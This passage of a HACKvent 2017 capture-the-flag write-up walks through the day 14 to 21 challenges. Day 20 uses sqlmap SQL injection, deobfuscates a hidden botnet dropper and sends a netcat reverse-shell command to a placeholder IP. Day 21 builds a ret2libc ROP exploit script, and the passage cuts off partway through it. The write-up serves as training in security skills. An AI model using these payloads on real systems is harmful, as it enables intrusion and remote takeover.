# Use modular arithmetic to find the decryption key
phi = (p - 1) * (q - 1)
d = cryptomath.findModInverse(e, phi)

# RSA decryption function
day14 = pow(cipher_text, d, n)

# Display the result
print binascii.unhexlify('%x' % day14)
```

Run the program and grab the flag:
```
$ ./day14.py 
HV17-5BMu-mgD0-G7Su-EYsp-Mg0b
```

The flag is: HV17-5BMu-mgD0-G7Su-EYsp-Mg0b
# Day 15: Unsafe Gallery - See pictures you shouldn't see

## Description

Level: Hard

The List of all Users of the Unsafe Gallery was leaked (See account list).
With this list the URL to each gallery can be constructed. E.g. you find Danny's gallery here.

Now find the flag in Thumper's gallery.

Provided:

- [Link to Danny's gallery](http://challenges.hackvent.hacking-lab.com:3958/gallery/bncqYuhdQVey9omKA6tAFi4rep1FDRtD4H8ftWiw)
- [account list](provided/accounts.csv.zip)

## Solution

We are provided with a URL and an accounts list.  It looks like the URL is a hash of one of the fields, but which hash function and which field?

Write a python program to compute different hashes on all fields:
```
$ cat find_danny.py
#!/usr/bin/env python

import csv
import hashlib

filename = 'accounts.csv'
dannyhash = 'bncqYuhdQVey9omKA6tAFi4rep1FDRtD4H8ftWiw'

accounts_file = open(filename, 'r')

reader = csv.DictReader(accounts_file, delimiter=',')

def try_all_hashes(row):
    for algo in hashlib.algorithms_available:
        for value in row.values():
            test_hash =  hashlib.new(algo, value).digest().encode('base64')
            if test_hash[:10] in dannyhash:
                print algo, value, test_hash, row

def main():
    print 'Hash to match: %s' % dannyhash
    for row in reader:
        if row['prename'] == 'Danny':
            try_all_hashes(row)

if __name__ == '__main__':
    main()
```

Run the program:
```
$ ./find_danny.py 
Hash to match: bncqYuhdQVey9omKA6tAFi4rep1FDRtD4H8ftWiw
SHA256 Danny.Dixon@sunflower.org bncqYuhdQVey9omKA6tAFi4rep1+FD+RtD4H/8ftWiw=
{'city': 'Crescent', 'galleryCount': '1', 'name': 'Dixon', 'zip': '75876', 'memberType': 'gold', 'email': 'Danny.Dixon@sunflower.org', 'advertisingId': '128486', 'prename': 'Danny', 'state': 'active', 'mbUsed': '39', 'logCorrelationId': '91819254', 'crmId': '44967219', 'address': '484 Cliffwood Boulevard', 'id': '32009', 'pictureCount': '15'}
```

Nice!  To create the URL, take a SHA256 hash of the email and remove the non-alphanumeric characters.

Now look at the galleries for everyone with the first name of Thumper and see if we find a flag by using a python program:

```
$ cat day15.py
#!/usr/bin/env python

import csv
import hashlib
import urllib2

filename = 'accounts.csv'
baseurl = 'http://challenges.hackvent.hacking-lab.com:3958/gallery/'

def main():
    accounts_file = open(filename, 'r')
    reader = csv.DictReader(accounts_file, delimiter=',')

    for row in reader:
        if row['prename'] == 'Thumper':
            email_hash = hashlib.new('sha256', row['email']).digest()
            gallery = email_hash.encode('base64').replace('+', '').replace('=', '').replace('/', '')
            url = baseurl + gallery
            webpage = urllib2.urlopen(url).read()
            print 'Checking %s' % url
            if ('HV17' in webpage):
                print '[+] Found a match! %s'% url
                for line in webpage.split('\n'):
                    if 'HV17' in line:
                        print line

if __name__ == '__main__':
    main()

```

Run the program and get the flag:
```
$ ./day15.py
...
[+] Found a match! http://challenges.hackvent.hacking-lab.com:3958/gallery/37qKYVMANnIdJ2V2EDberGmMz9JzS1pfRLVWaIKuBDw
<p>See you next spring at @HackyEaster. I count on you. HV17-el2S-0Td5-XcFi-6Wjg-J5aB</p>
```

It's worth a visit to [Thumper Lee's gallery](http://challenges.hackvent.hacking-lab.com:3958/gallery/37qKYVMANnIdJ2V2EDberGmMz9JzS1pfRLVWaIKuBDw).  It's very cute!

![day 15 flag](images/day15_flag.png)

The flag is: HV17-el2S-0Td5-XcFi-6Wjg-J5aB
# Day 16: Try to escape ... from the snake cage

## Description

Level: Hard

Santa programmed a secure jail to give his elves access from remote. Sadly the jail is not as secure as expected.

Provided:

- nc challenges.hackvent.hacking-lab.com 1034

## Solution

Connect to the challenge using netcat:
```
$ nc challenges.hackvent.hacking-lab.com 1034
```

Unfortunately, the up arrow does not work.  That can be easily fixed:
```
$ sudo apt install rlwrap
$ cat connect.sh
#!/bin/sh

REMOTE=challenges.hackvent.hacking-lab.com
PORT=1034
rlwrap nc -t $REMOTE $PORT
$ chmod 755 connect.sh
$ ./connect.sh
```

We are told where the flag is and dropped into a python interpreter:
```
The flag is stored super secure in the function SANTA!
>>> a = 
```

Trying to call SANTA() reverts to lower case:
```
>>> a = SANTA()
name 'santa' is not defined
```

We need to convert it to upper case.  However, it is denied:
```
>>> a = SANTA.upper()
Denied
```

It appears that some characters are banned in the interpreter, and return Denied:

```
>>> a = a
name 'a' is not defined
>>> a = b
Denied
```

With a little testing, we can determine what characters and numbers are allowed:

- allowed characters: a c d e i l n o p r s t v
- allowed numbers: 0 1 2 3 7 9

So, we need to convert santa to upper case, using only these characters.  The title() function works:
```
>>> a = print('S'.title()+'A'.title()+'N'.title()+'T'.title()+'A'.title())
SANTA
```

Calling the function tells us that we need a parameter:
```
>>> a = print(eval('s'.title()+'a'.title()+'n'.title()+'t'.title()+'a'.title()+'("")'))
No flag for you!
```

Knowing that the flag begins with "HV17", and by trying the allowable characters, we  guess:
```
>>> a = print(eval('s'.title()+'a'.title()+'n'.title()+'t'.title()+'a'.title()+'("1337")'))
HV17
```

Repeating the pattern gets the flag:
```
>>> a = print(eval('s'.title()+'a'.title()+'n'.title()+'t'.title()+'a'.title()+'("13371337133713371337133713371337")'))
HV17-J41l-esc4-p3ed-w4zz-3asy
```

The flag is: HV17-J41l-esc4-p3ed-w4zz-3asy
# Day 17: Portable NotExecutable

## Description

Level: Hard

Here is your flag.

But wait - it's not running, because it uses the new Portable NotExecutable Format. This runs only on Santas PC. Can you fix that?

Hint #1: IMAGE_FILE_HEADER and its friends

Hint #2: No reversing/bruteforcing needed. Just make it run ...

Hint #3: take the hint in the file serious, the black window should not appear (wine and cmd users might not see it - change OS or how you run the exe) 

Provided:

- [Portable_NotExecutable.zip](provided/Portable_NotExecutable.zip)

## Solution

First try to run it and notice that it does not run.
```
$ wine provided/Portable_NotExecutable.exe 
wine: Bad EXE format for Z:\home\jason\CURRENT\CTF\HackVent2017\day17\provided\Portable_NotExecutable.exe
```

Doing some searching, I found several useful resources on the PE format:

- [pefile](https://github.com/erocarrera/pefile) - Python library to interpret and display PE formats
- [PE Header Walkthrough](https://docs.google.com/open?id=0B3_wGJkuWLytQmc2di0wajB1Xzg) - Walkthrough of the PE sections
- [CFF Explorer](http://www.ntcore.com/exsuite.php) - Graphical tool to visualize the PE headers

Compare the PE Header Walkthrough with the header from the provided file.

There are several areas which do not match:

1. **The e_magic header** - the first two bytes at the head of the file are incorrect
2. **e_lfanew** - these are the location of the NT headers.  In the walkthrough this comes four bytes before the machine value (0x4c01),
   which is at offset 0x0044, making the location of the NT headers offset 0x0040.
3. **NT header signature** - this appears at the NT header offset is incorrect, it should be 0x5045000
4. **Number of headers** - this is set incorrectly to 6.  open up the file in CFF explorer, and observe that there are only 4 valid headers.
5. **Section header characteristics** - Hint #3 suggests that the program should be run as a Windows app, not a console.  Again using CFF explorer,
   determine that within the "Optional Header", the subsystem is incorrectly set to "Windows Console", when it should be "Windows GUI".


Use a hex editor to make changes (I used "ghex" on ubuntu):

|Offset  |  Previous Value  |   New Value  | Description                            |
|--------|------------------|--------------|----------------------------------------|
|0x0000  |   0x4D53         |    0x4D5A    | DOS Magic Header (e_magic)             |
|0x003C  |   0x20           |    0x40      | Location of NT headers (e_lfanew)      |
|0x0040  |   0x504E45       |    0x504500  | NT Header signature                    |
|0x0046  |   0x06           |    0x04      | Number of headers                      |
|0x009C  |   0x03           |    0x02      | Windows GUI Program                    |

![hex editor changes](images/day17_hexchanges.png)

Once the file has been modified, it can be run given the flag:

![HV17-VIQn-oHcL-hVd9-KdAP-txiK](images/day17_flag.png)

The flag is: HV17-VIQn-oHcL-hVd9-KdAP-txiK
# Day 18: I want to play a Game (Reloaded)

## Description

Level: Final

Last year we played some funny games together - do you remember? Ready for another round?
download the game here and play until you find the flag.

Hint #1: follow the fake flag in the unsigned binary. this challenge needs RE

Provided:

- [BLES-HV17.iso](provided/BLES-HV17.iso)

## Solution

Extract the contents of the ISO:
```
$ 7z x BLES-HV17.iso
$ find .
./PARAM.SFO
./USRDIR
./USRDIR/EBOOT.BIN
./USRDIR/hackvent.self
./ICON0.PNG
```

A web search for "PARAM.SFO" reveals that this is a Playstation 3 (PS3) game.
So, download the [RPCS3 Emulator](https://rpcs3.net/).

Open the emulator and try File -> Boot Game, and choose "EBOOT.BIN" but it fails.
However, try File -> Boot Self/Elf, and choose "hackvent.self" to get a hidden flag:

![hidden flag 2](images/hidden2_flag.png)

Download and use [True Ancestor](https://www.psxhax.com/threads/trueancestor-backup-retailer-v2-20-ps3-update-by-jjkkyu-released.2038/), to convert the SELF to an ELF.

Output the hex dump of each file:
```
$ xxd EBOOT.BIN > xxd_EBOOT.txt
$ xxd hackvent.elf > xxd_hackvent.txt
```

Use meld to compare the bytes:
```
$ meld xxd_EBOOT.txt xxd_hackvent.txt
```
![Meld result](images/day18_meld.png)

Use ghex to change the bytes highlighted in the difference:
```
$ cp hackvent.elf hackvent_flag.elf
$ ghex hackvent_flag.elf
```
![Ghex changes](images/day18_hex_changes.png)

Launch PS3 emulator to run the file, Run SELF
```
$ rpcs3-v0.0.4-2017-12-16-17bfb3b-9162_linux64.AppImage hackvent_flag.elf
```
![Day 18 flag](images/day18_flag.png)

The flag is: HV17-5mJ3-yxcm-WiUX-nZgW-eOlT
# Day 19: Cryptolocker Ransomware - Pay the price, Thumper did it already!

## Description

Level: Final

This flag has been taken for ransom. Transfer 10'000 Szabo to 0x1337C8b69bcb49d677D758cF541116af1F2759Ca with your HACKvent username (case sensitive) in the transaction data to get your personal decryption key. To get points for this challenge, enter the key in the form below.

Disclaimer: No need to spend r34l m0n3y!

Enter your 32-byte decryption key here. Type it as 64 hexadecimal characters without 0x at the beginning.

(There is an entry area and a submission button labelled "Sumbit key".

## Solution

"Szabo" is a denomination of Ethereum cryptocurrency.  Look up the [Ethereum contract ](https://www.etherchain.org/account/1337c8b69bcb49d677d758cf541116af1f2759ca).


Click on "code/source" and "copy" to get the bytecode:
```
6060604052600436106100405763ffffffff7c0100000000000000000000000000000000000000000000000000000000600035041663ea8796348114610154575b662386f26fc100003410610152577fec29ee18c83562d4f2e0ce62e38829741c2901da844c015385a94d8c9f03d486600260003660116000604051602001526040517f485631372d00000000000000000000000000000000000000000000000000000081526005810184848082843782019150508260ff167f0100000000000000000000000000000000000000000000000000000000000000028152600101935050505060206040518083038160008661646e5a03f1151561010157600080fd5b5050604051805190506040519081526040602082018190526011818301527f596f7572206b657920697320686572652e00000000000000000000000000000060608301526080909101905180910390a15b005b341561015f57600080fd5b61015260005473ffffffffffffffffffffffffffffffffffffffff9081169030163180156108fc0290604051600060405180830381858888f1935050505015156101a857600080fd5b5600a165627a7a7230582020304ba8cb5786445e5c47f840741111591a38057d40ac139568b31f9eaee3c70029
```

Click on "show opcodes".  Some opcodes do not decode properly and are shown as "Missing opcode".


Click on the Hash code for the Transaction:

```
Input: 0x5468756d706572
address: 0x1337c8b69bcb49d677d758cf541116af1f2759ca
data: 0x9880cccfe81a075ff0d029b4351ef4496ae452199b831634af57e5951466349d00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000011596f7572206b657920697320686572652e000000000000000000000000000000
topics: 0x0xec29ee18c83562d4f2e0ce62e38829741c2901da844c015385a94d8c9f03d486
```

The input decodes to the ASCII text "Thumper":
```
$ python -c "print '5468756d706572'.decode('hex') "
Thumper
```

And the first part of the data that is returned by the contract is 64 characters, which is promising:
```
9880cccfe81a075ff0d029b4351ef4496ae452199b831634af57e5951466349d
```

Install [ethereum](https://github.com/ethereum/go-ethereum/wiki/Installation-Instructions-for-Ubuntu).
```
$ sudo apt-get install software-properties-common
$ sudo add-apt-repository -y ppa:ethereum/ethereum
$ sudo apt-get update
$ sudo apt-get install ethereum
```

Now we have access to an Ethereum Virtual Machine (evm).


Create a script to run the bytecode using the bytecode and input for Thumper on the VM:

```
#!/bin/sh

# Obtained from https://www.etherchain.org/account/1337c8b69bcb49d677d758cf541116af1f2759ca#code
CODE="6060604052600436106100405763ffffffff7c0100000000000000000000000000000000000000000000000000000000600035041663ea8796348114610154575b662386f26fc100003410610152577fec29ee18c83562d4f2e0ce62e38829741c2901da844c015385a94d8c9f03d486600260003660116000604051602001526040517f485631372d00000000000000000000000000000000000000000000000000000081526005810184848082843782019150508260ff167f0100000000000000000000000000000000000000000000000000000000000000028152600101935050505060206040518083038160008661646e5a03f1151561010157600080fd5b5050604051805190506040519081526040602082018190526011818301527f596f7572206b657920697320686572652e00000000000000000000000000000060608301526080909101905180910390a15b005b341561015f57600080fd5b61015260005473ffffffffffffffffffffffffffffffffffffffff9081169030163180156108fc0290604051600060405180830381858888f1935050505015156101a857600080fd5b5600a165627a7a7230582020304ba8cb5786445e5c47f840741111591a38057d40ac139568b31f9eaee3c70029"

# Hex for Thumper
INPUT='5468756d706572'

# Run emulator
evm --code $CODE --input $INPUT --debug run
```

Unfortunately it does not run!  Looking at the debug trace, one of the last statements called is "Less Than":
```
LT              pc=00000074 gas=9999999913 cost=3
```


Instead change the LT to a GT.  The following [opcode reference](https://ethereum.stackexchange.com/questions/119/what-opcodes-are-available-for-the-ethereum-evm) is helpful.

Modify the bytes in the byte code from "341061" to "341161"
Run again and the debug now shows a result that matches the value in Thumper's contract:
```
$ ./day19.sh
...
00000000  98 80 cc cf e8 1a 07 5f  f0 d0 29 b4 35 1e f4 49  |......._..).5..I|
00000010  6a e4 52 19 9b 83 16 34  af 57 e5 95 14 66 34 9d  |j.R....4.W...f4.|
...
```

It worked for Thumper, now run for my username:
```
$ python -c 'print "veganjay".encode("hex")'
766567616e6a6179
```

Update the script to use my name:
```
#!/bin/sh

# Obtained from https://www.etherchain.org/account/1337c8b69bcb49d677d758cf541116af1f2759ca#code
# Modified version to run
CODE="6060604052600436106100405763ffffffff7c0100000000000000000000000000000000000000000000000000000000600035041663ea8796348114610154575b662386f26fc100003411610152577fec29ee18c83562d4f2e0ce62e38829741c2901da844c015385a94d8c9f03d486600260003660116000604051602001526040517f485631372d00000000000000000000000000000000000000000000000000000081526005810184848082843782019150508260ff167f0100000000000000000000000000000000000000000000000000000000000000028152600101935050505060206040518083038160008661646e5a03f1151561010157600080fd5b5050604051805190506040519081526040602082018190526011818301527f596f7572206b657920697320686572652e00000000000000000000000000000060608301526080909101905180910390a15b005b341561015f57600080fd5b61015260005473ffffffffffffffffffffffffffffffffffffffff9081169030163180156108fc0290604051600060405180830381858888f1935050505015156101a857600080fd5b5600a165627a7a7230582020304ba8cb5786445e5c47f840741111591a38057d40ac139568b31f9eaee3c70029"

# Hex for veganjay
INPUT='766567616e6a6179'

# Run emulator
evm --code $CODE --input $INPUT --debug run
```

The log shows:

```
$ ./day19.sh
...
#### LOGS ####
LOG1: 0000000000000000000000007265636569766572 bn=0 txi=0
00000000  ec29ee18c83562d4f2e0ce62e38829741c2901da844c015385a94d8c9f03d486
00000000  48 c8 ad 6a bd 1a 9f 36  4f 40 52 df 87 cf 46 1c  |H..j...6O@R...F.|
00000010  14 cf c6 e5 a3 08 fb 2a  14 9f a6 87 ed 61 ca 30  |.......*.....a.0|
00000020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 40  |...............@|
00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 11  |................|
00000060  59 6f 75 72 20 6b 65 79  20 69 73 20 68 65 72 65  |Your key is here|
00000070  2e 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
```

Thus the key for veganjay is:
```
48c8ad6abd1a9f364f4052df87cf461c14cfc6e5a308fb2a149fa687ed61ca30
```

Submit this into the form to get credit for the challenge.

NOTE: There is no HV17 flag for this challenge.
# Day 20: linux malware - oh boy, this will go wrong... =D

## Description

Level: Final

ohai my name is muffinx...
...um yeah btw. cyberwar just started and you should just pwn everyone?

Make sure you don't leave traces and make the lifes of your opponents harder, but fairplay!
You are a hacker? Then think like a hacker!
Attack! Defend! And trick!

Ladies and gentlemen,
We understand that you
Have come tonight
To bear witness to the sound
Of drum And Bass

We regret to announce
That this is not the case,
As instead
We come tonight to bring you
The sonic recreation of the end of the world.

Ladies and gentlemen,
Prepare
To hold
Your
Colour

OK.
Fuck it,
I lied.
It's drum and bass.
What you gonna do?

    WARNING:
    RUN INSIDE VM, THIS CONTAINER MAYBE DANGEROUS FOR YOUR SYSTEM,
    WE TAKE NO RESPONSIBILITY

You should keep the container inside the same host your haxxing on (same ip) or some things will not work...

Hint #1: check https://hub.docker.com/r/muffinx/hackvent17_linux_malware/ for regular updates, keep the container running (on the same ip) when you are haxxing the bot panel

Hint #2: you can also use https://hookbin.com/ to create private endpoints 

Provided:

- [Docker container](https://hub.docker.com/r/muffinx/hackvent17_linux_malware/)

## Solution

In Virtualbox, first create a snapshot of the HL VM.  Who knows what muffin is up to? :)  Once it is up and running, follow the instructions to [install Docker on Kali Linux](https://gist.github.com/nikallass/e5124756d0e2bdcf8981827f3ed40bcc). 

Start up the container but don't run anything yet...
```
$ docker run -it --entrypoint /bin/bash --user 0 muffinx/hackvent17_linux_malware
```

Snoop around a bit in the /root directory:
```
root@ce70738ffa68:~# cd /root
root@ce70738ffa68:~# ls
bot  checker.py  loopz.py  party.py
root@ce70738ffa68:~# file *
bot:        ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c64b9bdedd4ce5e3d906ec848464822af0a0c2f5, not stripped
checker.py: Python script, ASCII text executable
loopz.py:   Python script, ASCII text executable
party.py:   Python script, ASCII text executable
```

Investigate the contents of the files

- **bot**: a C executable - we will get back to this
- **checker.py**: appears to connect to a URL
- **loopz.py**: repeatedly runs the bot executable
- **party.py**: looks it is here just to confuse us!

Decode the strings in checker.py:
```
# echo aHR0cDovL2NoYWxsZW5nZXMuaGFja3ZlbnQuaGFja2luZy1sYWIuY29tOjgwODEvP25vbmNl | base64 -d
http://challenges.hackvent.hacking-lab.com:8081/?nonce
```

In English, checker.py does the following:

1. Get a nonce from http://challenges.hackvent.hacking-lab.com:8081/?nonce
2. Create a new nonce by performing an XOR on the received nonce and the pattern [0x11, 0x22, ..., 0xFF]
3. Post the nonce

This is interesting and comes in more use later.

Next run the "bot" command and take a peek at the /tmp directory:

```
root@ce70738ffa68:/tmp# ls -a 
.   .EkxMsqGWCgpmgBtRjVIehJWZuCTUizpH  .OnLZJarCYHMNHzAtQoMnuVmralRrfBmc  .mkVqqPhlXgvtrdPgMEPHzpYSsLpUqvQo  .yVYaePVLvLWESIaMYqVWaXHSjlimNAau
..  .JinbBRuFUCLHaBQGivWoRCabpkMeByca  .hceHdQpdzbvHCWcDKuDjTnyKEwFDqNcI  .tCrFiNvvMEaulVfocPjBIjrXAXQlnFne

```

One of those files looks like the ping man page, but it also contains a hidden python program:
```
root@ce70738ffa68:/tmp# cat .yVYaePVLvLWESIaMYqVWaXHSjlimNAau 
# -*- coding: utf-8 -*-

'''
PING(8)                                                                          System Manager's Manual: iputils                                                                          PING(8)

NAME
       ping - send ICMP ECHO_REQUEST to network hosts
...
import base64, os, re, urllib2
from easyprocess import EasyProcess

os.system('/root/checker.py') # this does nothing
...
```

De-obfuscate by renaming the functions and decoding the base64.  The resulting code is:
```
#!/usr/bin/env python

import base64, os, re, urllib2
from easyprocess import EasyProcess

os.system('/root/checker.py')

def x(t): return ''.join([chr(ord(t[i])^[0x66, 0x66, 0x66, 0x13, 0x37, 0x42, 0x69, 0x33, 0x01, 0x13][i%10]) for i in range(len(t))])

def ok_cool(c):
    try:
        print 'c = c'
        c = x(base64.b64decode(c))
        EasyProcess(c).call(timeout=2)
        print 'Execute command %s' % c 
    except Exception as e:
        print 'exception: ', e

def wtf(n):
    t = 'https://twitter.com/' + n; cs = []
    print 't = %s' % t
    try: c_txt = urllib2.urlopen(t).read(); cs = re.findall('TweetTextSize(.*)</p', c_txt)
    except: pass
    for c in cs:
        try:
            c = c[c.index('>')+1:]
            if '<a href="/muffiniks" class="twitter-atreply pretty-link js-nav" dir="ltr" data-mentioned-user-id="764117042274373632" ><s>@</s><b>muffiniks</b></a>' in c and ' <a href="/hashtag/hackvent?src=hash" data-query-source="hashtag_click" class="twitter-hashtag pretty-link js-nav" dir="ltr" ><s>#</s><b>hackvent</b></a>' in c and ' rel="nofollow noopener" dir="ltr" data-expanded-url="http://hackvent.hacking-lab.com" class="twitter-timeline-link" target="_blank" title="http://hackvent.hacking-lab.com" ><span class="tco-ellipsis"></span><span class="invisible">http://</span><span class="js-display-url">hackvent.hacking-lab.com</span><span class="invisible"></span><span class="tco-ellipsis"><span class="invisible">&nbsp;</span></span></a> ' in c:
                c = c[c.index('MUFFIN_BOTNET:')+len('MUFFIN_BOTNET:'):]; c = c[:c.index(':MUFFIN_BOTNET')]; ok_cool(c)
        except:
            print 'exception 2'

def main():
    ns = []
    try:
        n_txt = urllib2.urlopen('http://challenges.hackvent.hacking-lab.com:8081/?twitter').read()
        ns = list(set([n for n in n_txt.split('|') if len(n) > 1]))
 
    except Exception as e:
        print 'exception 3', e
    for n in ns: 
        print 'calling wtf(%s)' % n
        wtf(n)
        
main()
```

Reading through the unobfuscated code it becomes apparent what it is doing:

1. Pull a list of names off of http://challenges.hackvent.hacking-lab.com:8081/?twitter
2. For each name that is on the list, get their messages from twitter.com
3. If the message is in a special format, decode it and execute the system command.

But how do we get my name added to the list at http://challenges.hackvent.hacking-lab.com:8081/?twitter ?

First stop, browse to [http://challenges.hackvent.hacking-lab.com:8081/?twitter](http://challenges.hackvent.hacking-lab.com:8081/?twitter)
Oh boy, Rick Astley, everyone's favorite.  Look at the source of the web page to reveal a hidden form:

```
$ curl http://challenges.hackvent.hacking-lab.com:8081
<html>
<head></head>
<body>

<center>
  <iframe height="100%" width="100%" src="https://www.youtube.com/embed/dQw4w9WgXcQ?rel=0&amp;controls=0&amp;showinfo=0&amp;autoplay=1" frameborder="0" gesture="media" allow="encrypted-media" allowfullscreen></iframe>
</center>

<form action="" method="POST">
  <input type="text" name="password" hidden />
  <input type="submit" name="Submit" value="Login" hidden />
</form>

</body>
```

Test for SQL injection:
```
$ curl -X POST -d "password='&Submit=Login" http://challenges.hackvent.hacking-lab.com:8081
...
query failed : SELECT AES_ENCRYPT(''','muffin_botz_hax_pw') AS enc FROM passwords
```

Use SQLMap to launch a shell:

```
$ sqlmap --level 2 --url=http://challenges.hackvent.hacking-lab.com:8081 --data=password=+Submit=Login -p password --dbms=MySQL --columns --threads 10 -D muffin_bot --sql-shell
sql-shell> select AES_DECRYPT(password, 'muffin_botz_hax_pw') from passwords;
'this_pw_is_so_eleet'
```

Use the password to access the next hidden form:

```
$ curl -X POST -d "password=this_pw_is_so_eleet&Submit=Login" http://challenges.hackvent.hacking-lab.com:8081
...
  <form action="" method="POST">
    <input type="text" name="twitter_name" hidden />
    <input type="submit" name="Submit" value="Add Twitter Name" hidden />
  </form>
...
```

Use burp to capture the client response, modify it to remove the video and remove the hidden tags:
```
  <form action="" method="POST">
    <input type="text" name="twitter_name" />
    <input type="submit" name="Submit" value="Add Twitter Name" />
  </form>

```

Use this form to add your twitter name.

Now we can run botnet commands.  There are many ways of finding the flag, but the most fun is a reverse shell botnet command:

```
#!/usr/bin/env python

import base64

def x(t):
    return ''.join([chr(ord(t[i])^[0x66, 0x66, 0x66, 0x13, 0x37, 0x42, 0x69, 0x33, 0x01, 0x13][i%10]) for i in range(len(t))])

def tweet(msg):
    return 'test @muffiniks #hackvent http://hackvent.hacking-lab.com ' + encrypt(msg)

def encrypt(msg):
    return 'MUFFIN_BOTNET:' + base64.b64encode(x(msg)) + ':MUFFIN_BOTNET'

def decrypt(msg):
    msg = msg.replace('MUFFIN_BOTNET:','').replace(':MUFFIN_BOTNET','')
    return x(base64.b64decode(msg))

if __name__ == '__main__':
    print tweet("sh -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xxx.xxx.xxx.xxx 9999 >/tmp/f'")
```

On a publicly facing host, start a netcat listener:
```
$ nc -l 9999
```

The only problem is that **ALL** bots will try to connect.  So keep each time type "hostname" and "exit" until the correct one connects.

Wait until the bot connects and find the flag in the /root directory:
```
$ hostname
challenges.hackvent.hacking-lab.com
$ cd /root
$ ls
secret
$ cat secret
HV17-wh4t-4b0ut-n!x-m4l3w4re-4nd-cyberwarezzz
```

The flag is: HV17-wh4t-4b0ut-n!x-m4l3w4re-4nd-cyberwarezzz
# Day 21: tamagotchi - ohai fuud or gtfo

## Description

Level: Final

ohai

I'm a little tamagotchi who wants fuuuuud, pls don't giveh me too much or I'll crash...

Provided:

- nc challenges.hackvent.hacking-lab.com 31337
- [File #1: tamagotchi](provided/tamagotchi)
- [File #2: libc-2.26.so](provided/libc-2.26.so)

## Solution

First download the provided files and open up tamagotchi with Hopper.  Generate the pseduocode and observe the following statement used in the main function
```
fgets(&var_4D0, 0x400, *__TMC_END__);
```

The use of this function suggests an overflow vulnerability.  The description gives a hint to "crash" the tamagotchi.  So, let's try!

```
$ ./tamagotchi
[MENU]
1.) eat
2.) bye
[ch01c3]> 
1
[f00d]> 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] nom nom nom 
[ch01c3]> 
2
[+] bye bye
Segmentation fault (core dumped)
```

Use GDB PEDA to help determine the offset:
```
$ gdb tamagotchi
gdb-peda$ pattern_create 250 pat250
Writing pattern of 250 chars to filename "pat250"
gdb-peda$ run
[f00d]> 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%b
gdb-peda$ pattern_search
Registers point to pattern buffer:
[RSP] --> offset 216 - size ~36
```

Good! It crashed due to a buffer overflow.  But we want it to do something useful.  Use the radare2 tool "rabin2" to get some more information on the binary:
```
$ rabin2 -I tamagotchi
...
nx       true
...
```

Stack execution is prevented, which makes things more difficult.  Given that the libc library was provided, a [return to libc attack](https://en.wikipedia.org/wiki/Return-to-libc_attack) may be possible.  And we need to defeat ASLR as well.

For me, these topics are quite new and I've never done them before.
Fortunately there is a 3 part  64-bit linux stack smashing tutorial: [part1](https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/), [part2](https://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/) and [part3](https://blog.techorganic.com/2016/03/18/64-bit-linux-stack-smashing-tutorial-part-3/).

So let's dig in!

Identify a ROP gadget for "pop rdi":
```
$ ropper --file ./tamagotchi --search "pop rdi"
...
[INFO] File: ./tamagotchi
0x0000000000400803: pop rdi; ret;
```

Look up the offset of "puts" in libc:
```
$ objdump -S libc-2.26.so | grep _puts | head -3
...
0000000000078460 <_IO_puts@@GLIBC_2.2.5>:
```

Determine the puts() entry in the Global Offset Table (GOT):
```
$ objdump -R tamagotchi | grep puts
0000000000601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
```

Determine the address of puts@plt:
```
$ objdump -S ./tamagotchi | grep -i puts | head -2
...
00000000004004b0 <puts@plt>:
```

Putting this altogether, we can find the start of libc by sending the payload:
```
from pwn import *

padding    = "A"*216             # padding to RIP's offset 
popret     = 0x400803            # gadget to "pop rdi; ret"
puts_plt   = 0x4004b0            # address of puts@plt in tamagotchi
puts_got   = 0x601018            # address of puts GOT lookup in tamagotchi
main       = 0x4006ca            # start of main function

payload = padding + p64(popret) + p64(puts_got) + p64(puts_plt) + p64(main)
```

Now find the system() call in libc:
```
$ objdump -S libc-2.26.so | grep system | head -1
0000000000047dc0 <__libc_system@@GLIBC_PRIVATE>:
```

And find the string "/bin/sh" in libc:
```
$ strings -a -t x libc-2.26.so | grep "/bin/sh"
 1a3ee0 /bin/sh
```

With these offsets, we can construct a shell payload by the following:
```
system_addr = libc_start + system_off
binsh_addr  = libc_start + binsh_off

payload = padding + p64(popret) + p64(binsh_addr) + p64(system_addr) + p64(main)
```

The full program is:
```
$ cat day21.py
#!/usr/bin/env python

from pwn import *

IP="challenges.hackvent.hacking-lab.com"
PORT=31337

popret     = 0x400803            # gadget to pop rdi; ret
puts_plt   = 0x4004b0            # address of puts@plt in tamagotchi
puts_got   = 0x601018            # address of puts GOT lookup in tamagotchi
main       = 0x4006ca            # return to main

# Offsets
puts_off   = 0x78460             # puts offset in libc
system_off = 0x47dc0             # system() offset in libc
binsh_off  = 0x1a3ee0            # "/bin/sh" string offset in libc

# Padding of 216 chracters
padding = "A"*216                # padding to RIP's offset

# Connect
r = remote(IP, PORT)

# Get past the menu items
print r.recvuntil("[ch01c3]>")
r.sendline("1")
print r.recvuntil("[f00d]>")

# Payload is set to leak the address of the puts function
payload = padding + p64(popret) + p64(puts_got) + p64(puts_plt) + p64(main)
